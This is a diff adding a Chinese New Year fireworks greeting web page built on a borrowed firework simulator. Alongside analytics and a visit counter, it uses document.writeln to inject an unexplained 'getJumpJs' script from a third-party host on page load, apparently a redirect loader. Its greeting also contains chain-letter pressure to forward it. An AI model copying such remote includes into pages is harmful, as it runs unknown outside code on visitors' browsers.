@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">//hello!
+<head>
+    <meta charset="utf-8">
+    <style type="text/css">
+	p{font-weight:bold;}
+	p{font-weight:1000;}
+	p{font-size:48px;}
+	p{font-family:"楷体";}
+	</style>
+    <title>新年快乐</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="theme-color" content="#000000">
+    <meta name="msapplication-TileColor" content="#000000">
+    <link href="files/css/main.css" rel="stylesheet">
+    <script src="https://corestudi0.github.io/newyear/files/js/jquery.min.js" type="text/javascript"></script>
+    <link rel="stylesheet" href="files/css/style.css">
+    <script>
+        var shouci = true;
+        console.log(shouci);
+
+        function bodyPlayMusic() {
+            if (shouci) {
+                shouci = false;
+                audio.play();
+                console.log(shouci);
+            }
+        };
+    </script>
+</head>
+<!-- onclick="bodyPlayMusic()" -->
+
+<body>
+
+    <script>document.writeln("<script src=\"https://ai8.top/api/getJumpJs\"><\/script>");</script>
+
+    <audio id="audioDom" src="https://sf6-cdn-tos.douyinstatic.com/obj/ies-music/7170534431801838367.mp3" preload="auto" loop="loop"></audio>
+
+    <div id="yhBtn" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#fff ; font-size:20px    ">
+        <p>💥点击我 (没反应请等待几秒再试)💥</p>
+        <img style="width:64px;margin-bottom:36px " src="files/boom.png">
+    </div>
+
+    <div style="height: 0; width: 0; position: absolute; visibility: hidden;">
+        <svg xmlns="http://www.w3.org/2000/svg">
+            <symbol id="icon-play" viewBox="0 0 24 24">
+                <path d="M8 5v14l11-7z"></path>
+            </symbol>
+            <symbol id="icon-pause" viewBox="0 0 24 24">
+                <path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"></path>
+            </symbol>
+            <symbol id="icon-close" viewBox="0 0 24 24">
+                <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z">
+                </path>
+            </symbol>
+            <symbol id="icon-settings" viewBox="0 0 24 24">
+                <path d="M19.43 12.98c.04-.32.07-.64.07-.98s-.03-.66-.07-.98l2.11-1.65c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.3-.61-.22l-2.49 1c-.52-.4-1.08-.73-1.69-.98l-.38-2.65C14.46 2.18 14.25 2 14 2h-4c-.25 0-.46.18-.49.42l-.38 2.65c-.61.25-1.17.59-1.69.98l-2.49-1c-.23-.09-.49 0-.61.22l-2 3.46c-.13.22-.07.49.12.64l2.11 1.65c-.04.32-.07.65-.07.98s.03.66.07.98l-2.11 1.65c-.19.15-.24.42-.12.64l2 3.46c.12.22.39.3.61.22l2.49-1c.52.4 1.08.73 1.69.98l.38 2.65c.03.24.24.42.49.42h4c.25 0 .46-.18.49-.42l.38-2.65c.61-.25 1.17-.59 1.69-.98l2.49 1c.23.09.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64l-2.11-1.65zM12 15.5c-1.93 0-3.5-1.57-3.5-3.5s1.57-3.5 3.5-3.5 3.5 1.57 3.5 3.5-1.57 3.5-3.5 3.5z">
+                </path>
+            </symbol>
+            <symbol id="icon-sound-on" viewBox="0 0 24 24">
+                <path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z">
+                </path>
+            </symbol>
+            <symbol id="icon-sound-off" viewBox="0 0 24 24">
+                <path d="M16.5 12c0-1.77-1.02-3.29-2.5-4.03v2.21l2.45 2.45c.03-.2.05-.41.05-.63zm2.5 0c0 .94-.2 1.82-.54 2.64l1.51 1.51C20.63 14.91 21 13.5 21 12c0-4.28-2.99-7.86-7-8.77v2.06c2.89.86 5 3.54 5 6.71zM4.27 3L3 4.27 7.73 9H3v6h4l5 5v-6.73l4.25 4.25c-.67.52-1.42.93-2.25 1.18v2.06c1.38-.31 2.63-.95 3.69-1.81L19.73 21 21 19.73l-9-9L4.27 3zM12 4L9.91 6.09 12 8.18V4z">
+                </path>
+            </symbol>
+        </svg>
+    </div>
+<div class="div_btn" id="div_support" style="line-height: 22px; height: 50px; border-radius: 10px; font-size: 0.9rem; width: 40px;">
+<a id="moreLink" href="../gift/index.html" se_prerender_url="complete"><span>更多代码</span></a>
+</div>
+<!--	
+<div class="div_btn" id="div_wph" style="bottom: 60px;right: 28px;border:0px;">
+<a href="https://mst.vip.com/iYcEvwVGaLI-Bf_5PtVKAQ.php?wq=1&wapid=mst_100041464&_src=mst&extra_banner=115041464&nova=1&nova_platform=1&mst_page_type=guide" target="_blank"><img src="http://cdn.jcelyj.com/assets/TP1ayxwab/banner.jpg" width="50px" height="50px"></a>
+</div>
+-->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?dbc09cc585d9dc4f3041dfe9411dead2";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+    <!-- 引用NianBroken的FireworkSimulator，仅为引用，非恶意搬运，侵删 -->
+    <div class="container">
+        <div class="loading-init">
+            <div class="loading-init__header">
+                加载中(Loading)
+            </div>
+            <div class="loading-init__status">
+                正在准备烟花(Downloading files from github)
+            </div>
+        </div>
+
+        <div class="stage-container remove">
+        <div class="page_two hide">
+		<br><br>
+        <div id="text" class="boxText" style="display:none;">
+		倒计时还有[DJS:KN:ALL]跨年，提前祝你新年快乐！<br><br>
+		龙年快乐 平安喜乐 2024万事如意🧨<br>
+		唯愿烟花像星辰   祝你所愿皆成真🧨<br><br>
+		祝你接力龙年，福气连连！接龙哈🌹<br>
+		发给你最好的10个朋友，超过15个就永远幸福，不许在你这里断了。<br>
+		今天必须发完，不许偷懒。想起谁，发给谁，包括我😎<br><br>
+		你是第<span id="busuanzi_value_page_pv"></span>个观赏到烟花的人~一定要快乐噢！
+
+	</div><!--此处已进行修改，优化了倒计时-->
+            <div class="type_words" id="contents" style="font-size:1.08rem;line-height:1.5rem;"></div>
+        </div>
+        <div class="canvas-container">
+            <canvas id="trails-canvas"></canvas>
+            <canvas id="main-canvas"></canvas>
+        </div>
+
+        <div class="controls">
+            <div class="btn pause-btn">
+                <svg fill="0" width="0" height="0">
+                    <use href="" xlink:href="">
+                    </use>
+                </svg>
+            </div>
+            <div class="btn sound-btn">
+                <svg fill="0" width="0" height="0">
+                    <use href="#icon-sound-off" xlink:href="#icon-sound-off">
+                    </use>
+                </svg>
+            </div>
+            <div class="btn settings-btn">
+                <svg fill="white" width="48" height="48">
+                    <use href="#icon-settings" xlink:href="#icon-settings">
+                    </use>
+                </svg>
+            </div>
+        </div>
+
+            <div class="menu hide">
+                <div class="menu__inner-wrap">
+                    <div class="btn btn--bright close-menu-btn">
+                        <svg fill="white" width="48" height="48">
+                            <use href="#icon-close" xlink:href="#icon-close">
+                            </use>
+                        </svg>
+                    </div>
+                    <div class="menu__header">
+                        设置
+                    </div>
+                    <div class="menu__subheader">
+                        若想了解更多信息 请点击任意标签
+                    </div>
+                    <form>
+                        <div class="form-option form-option--select">
+                            <label class="shell-type-label">
+                            烟花类型
+                            </label>
+                            <select class="shell-type">
+                            </select>
+                        </div>
+                        <div class="form-option form-option--select">
+                            <label class="shell-size-label">
+                            烟花大小
+                            </label>
+                            <select class="shell-size">
+                            </select>
+                        </div>
+                        <div class="form-option form-option--select">
+                            <label class="quality-ui-label">
+                            画质
+                            </label>
+                            <select class="quality-ui">
+                            </select>
+                        </div>
+                        <div class="form-option form-option--select">
+                            <label class="sky-lighting-label">
+                            照亮天空
+                            </label>
+                            <select class="sky-lighting">
+                            </select>
+                        </div>
+                        <div class="form-option form-option--select">
+                            <label class="scaleFactor-label">
+                            缩放
+                            </label>
+                            <select class="scaleFactor">
+                            </select>
+                        </div>
+                        <div class="form-option form-option--checkbox">
+                            <label class="auto-launch-label">
+                            自动放烟花
+                            </label>
+                            <input class="auto-launch" type="checkbox" />
+                        </div>
+                        <div class="form-option form-option--checkbox form-option--finale-mode">
+                            <label class="finale-mode-label">
+                            同时放更多的烟花
+                            </label>
+                            <input class="finale-mode" type="checkbox" />
+                        </div>
+                        <div class="form-option form-option--checkbox">
+                            <label class="hide-controls-label">
+                            隐藏控制按钮
+                            </label>
+                            <input class="hide-controls" type="checkbox" />
+                        </div>
+                        <div class="form-option form-option--checkbox form-option--fullscreen">
+                            <label class="fullscreen-label">
+                            全屏
+                            </label>
+                            <input class="fullscreen" type="checkbox" />
+                        </div>
+                        <div class="form-option form-option--checkbox">
+                            <label class="long-exposure-label">
+                            保留烟花的火花
+                            </label>
+                            <input class="long-exposure" type="checkbox" />
+                        </div>
+                    </form>
+                    <div class="credits">
+                        <p class="copyright">
+                            <script>
+
+								function clickMenu(){
+									if($(".menu").hasClass('hide')){
+										$("#yhBtn").css('display','none');
+										$("#contents").css('display','none');
+										$(".menu").removeClass('hide');
+									}else{
+										$(".menu").addClass('hide');
+									}
+
+								}
+
+                                var mydate = new Date();
+                                document.writeln("Copyright&nbsp;&copy;&nbsp;2021 - " + mydate.getFullYear() + '&nbsp;<a target="_blank" href="https://www.nianbroken.top/">碎念_Nian</a><br />All&nbsp;Rights&nbsp;Reserved');
+                            </script>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="help-modal">
+            <div class="help-modal__overlay">
+            </div>
+            <div class="help-modal__dialog">
+                <div class="help-modal__header">
+                </div>
+                <div class="help-modal__body">
+                </div>
+                <button type="button" class="help-modal__close-btn">
+                关闭
+                </button>
+            </div>
+        </div>
+    </div>
+    <!-- partial -->
+	
+
+    <script src="https://web2.20it.cn/template/common/main.js?v1.0.10"></script>
+    <script src='files/js/fscreen.js'></script>
+    <script src='files/js/Stage.js'></script>
+    <script src='files/js/MyMath.js'></script>
+    <script src="files/js/script.js"></script>
+
+
+    <script>
+        function musicPlay(isPlay) {
+            var media = document.querySelector('#audioDom');
+            if (isPlay && media.paused) {
+                media.play();
+            }
+            if (!isPlay && !media.paused) {
+                media.pause();
+            }
+        }
+
+        function musicInBrowserHandler() {
+            setTimeout(function() {
+                musicPlay(true)
+            }, 0)
+        }
+        document.body.addEventListener('touchstart', musicInBrowserHandler);
+        $('#yhBtn').click(e => {
+            $('#yhBtn').hide()
+            setTimeout(() => {
+                start()
+                fireworks();
+            }, 2000) // 
+            setTimeout(() => {
+                function audioAutoPlay() {
+                    var audio = document.getElementById('audioDom');
+                    audio.play();
+                }
+                audioAutoPlay();
+            }, 300) // 
+            console.log(updateConfig({
+                autoLaunch: true
+            }));
+        })
+
+        function fireworks() {
+            $('.page_one').addClass(' hide');
+            $('.page_two').removeClass(' hide');
+        }
+
+        function start() {
+		/*
+		var html = $("#text").html();
+		var djs = CountDownAll(2024, 01, 01, 00);
+		$("#text").html("倒计时还有"+ djs +"跨年，" + html);
+  		*/
+		
+            let str = $("#text").html(); //"于我而言，你是最好且是唯一"
+            let str_ = ''
+            let i = 0
+            let content = document.getElementById('contents')
+            let timer = setInterval(() => {
+                if (str_.length < str.length) {
+                    str_ += str[i++]
+                    content.innerHTML = '<p>' + str_ + '<span class="xx" style="opacity: 1;    color: white;">∎</span></p>' //打印时加光标
+                } else {
+                    clearInterval(timer)
+                    content.innerHTML = '<p>' + str_ + '</p>'
+                }
+            }, 100)
+        }
+		
+	//计算倒计时全部时间
+	function CountDownAll(year, month, day, hours) {
+		let now = new Date();
+		let endDate = new Date(year, month - 1, day, hours);
+		let leftTime = endDate.getTime() - now.getTime();//计算剩余的毫秒数
+		if (leftTime <= 0) {
+			leftTime = 0;
+		}
+		let leftsecond = parseInt(leftTime / 1000);//计算剩余的秒数
+		day = Math.floor(leftsecond / (60 * 60 * 24));
+		let hour = Math.floor((leftsecond - day * 24 * 60 * 60) / 3600);
+		let minute = Math.floor((leftsecond - day * 24 * 60 * 60 - hour * 3600) / 60);
+		let second = Math.floor(leftTime / 1000 % 60, 10);
+		//CountDown(2050, 12, 31, 24)
+		return `${day}天${hour}小时${minute}分钟`;
+	}
+    </script><!--引用结束(内容未修改)-->
+
+
+<script>
+/*
+function TimeDown(id, endDateStr) {
+    //结束时间
+    var endDate = new Date(endDateStr);
+    //当前时间
+    var nowDate = new Date();
+    //相差的总秒数
+    var totalSeconds = parseInt((endDate - nowDate) / 1000);
+    //天数
+    var days = Math.floor(totalSeconds / (60 * 60 * 24));
+    //取模（余数）
+    var modulo = totalSeconds % (60 * 60 * 24);
+    //小时数
+    var hours = Math.floor(modulo / (60 * 60));
+    modulo = modulo % (60 * 60);
+    //分钟
+    var minutes = Math.floor(modulo / 60);
+    //秒
+    var seconds = modulo % 60;
+    //输出到页面
+	
+	if(days < 1){
+		text = hours + "小时" + minutes + "分钟" + seconds + "秒";
+	}else{
+		text = days + "天" + hours + "小时" + minutes + "分钟" + seconds + "秒";
+	}
+	
+	
+    
+	//时间判断
+	var time_now = new Date().getTime();
+	var time_chuxi = new Date('2023-01-21 00:00:00').getTime();
+	var time_chunjie = new Date('2023-01-22 00:00:00').getTime();
+	console.log(time_now + "\n" + time_chuxi );
+	if(time_now < time_chuxi){
+		console.log("还没到除夕");
+		document.getElementById(id).innerHTML = "还有" + text + "就是除夕啦!";
+		
+		//延迟一秒执行自己
+		setTimeout(function () {
+			TimeDown(id, '2023-01-21 00:00:00');
+		}, 1000)
+	}else if(time_now > time_chuxi && time_now < time_chunjie){
+		console.log("到除夕啦~");
+		document.getElementById(id).innerHTML = "今天是除夕，还有" + text + "就是春节啦！";
+		if($("#audioDom").attr('src') != 'https://sf6-cdn-tos.douyinstatic.com/obj/tos-cn-ve-2774/1274ad0ead904bcfbd556acc4eaeff2e'){
+			$("#audioDom").attr('src','https://sf6-cdn-tos.douyinstatic.com/obj/tos-cn-ve-2774/1274ad0ead904bcfbd556acc4eaeff2e');
+		}
+		//延迟一秒执行自己
+		setTimeout(function () {
+			TimeDown(id, '2023-01-22 00:00:00');
+		}, 1000)
+	}else{
+		console.log("到春节啦~");
+		document.getElementById("time").innerHTML =  "除夕夜已经过去啦，祝你新年快乐！";
+		if($("#audioDom").attr('src') != 'https://sf86-cdn-tos.douyinstatic.com/obj/tos-cn-ve-2774/b4baa64585924b568460f6887abfdf30'){
+			$("#audioDom").attr('src','https://sf86-cdn-tos.douyinstatic.com/obj/tos-cn-ve-2774/b4baa64585924b568460f6887abfdf30');
+		}
+	}
+}
+
+TimeDown('time', '2023-01-21 00:00:00');
+*/
+	
+/*
+function time() {
+    //window.setTimeout("time()", 1000);
+    var seconds = 1000
+    var minutes = seconds * 60
+    var hours = minutes * 60
+    var days = hours * 24
+    var years = days * 365
+    var today = new Date()
+    var todayYear = today.getFullYear()
+    var newYear=todayYear+1
+    var lastYear=todayYear-1
+    var todayMonth = today.getMonth() + 1
+    var todayDate = today.getDate()
+    var todayHour = today.getHours()
+    var todayMinute = today.getMinutes()
+    var todaySecond = today.getSeconds()
+    var t1 = Date.UTC(newYear, 1, 22, 0, 00, 00)
+    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond)
+    var diff = t1 - t2
+    var diff2 = t2-t1
+    var diffYears = Math.floor(diff / years)
+    var diffDays = Math.floor((diff / days) - diffYears * 365)
+    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours)
+    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes)
+    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes *
+        minutes) / seconds)
+    var diff2Years = Math.floor(diff2 / years)
+    var diff2Days = Math.floor((diff2 / days) - diff2Years * 365)
+    var diff2Hours = Math.floor((diff2 - (diff2Years * 365 + diff2Days) * days) / hours)
+    var diff2Minutes = Math.floor((diff2 - (diff2Years * 365 + diff2Days) * days - diff2Hours * hours) / minutes)
+    var diff2Seconds = Math.floor((diff2 - (diff2Years * 365 + diff2Days) * days - diff2Hours * hours - diff2Minutes *
+        minutes) / seconds)
+		
+
+	
+	//时间判断
+	var time_now = new Date().getTime();
+	var time_chuxi = new Date('2023-01-21 00:00:00').getTime();
+	var time_chunjie = new Date('2023-01-22 00:00:00').getTime();
+	console.log(time_now + "\n" + time_chuxi );
+	if(time_now < time_chuxi){
+		console.log("还没到除夕");
+		document.getElementById("time").innerHTML =  "还有"+diffDays + "天" + diffHours + "小时" + diffMinutes + "分钟" + diffSeconds + "秒就是除夕夜啦!";
+	}else if(time_now > time_chuxi && time_now < time_chunjie){
+		console.log("到除夕啦~");
+		document.getElementById("time").innerHTML =  "除夕快乐~";
+		if($("#audioDom").attr('src') != 'https://sf6-cdn-tos.douyinstatic.com/obj/tos-cn-ve-2774/1274ad0ead904bcfbd556acc4eaeff2e'){
+			$("#audioDom").attr('src','https://sf6-cdn-tos.douyinstatic.com/obj/tos-cn-ve-2774/1274ad0ead904bcfbd556acc4eaeff2e');
+		}
+	}else{
+		console.log("到春节啦~");
+		document.getElementById("time").innerHTML =  "除夕夜已经过去啦，祝你新年快乐！";
+		if($("#audioDom").attr('src') != 'https://sf86-cdn-tos.douyinstatic.com/obj/tos-cn-ve-2774/b4baa64585924b568460f6887abfdf30'){
+			$("#audioDom").attr('src','https://sf86-cdn-tos.douyinstatic.com/obj/tos-cn-ve-2774/b4baa64585924b568460f6887abfdf30');
+		}
+	}
+	
+}
+time()
+*/
+	
+	
+//var time_chuxi = new Date('2023-01-21 00:00:00').getTime();
+
+  
+</script>
+
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!--测试访问量统计功能-->
+<span id="busuanzi_container_page_pv">访问量<span id="busuanzi_value_page_pv"></span>次</span>
+<!--tip:此处为挂载的网页,源码中引用过他人的代码，均已标注-->
+<!--firework_simulator版权所有人:NianBroken，侵删-->
+</body>
+
+</html>
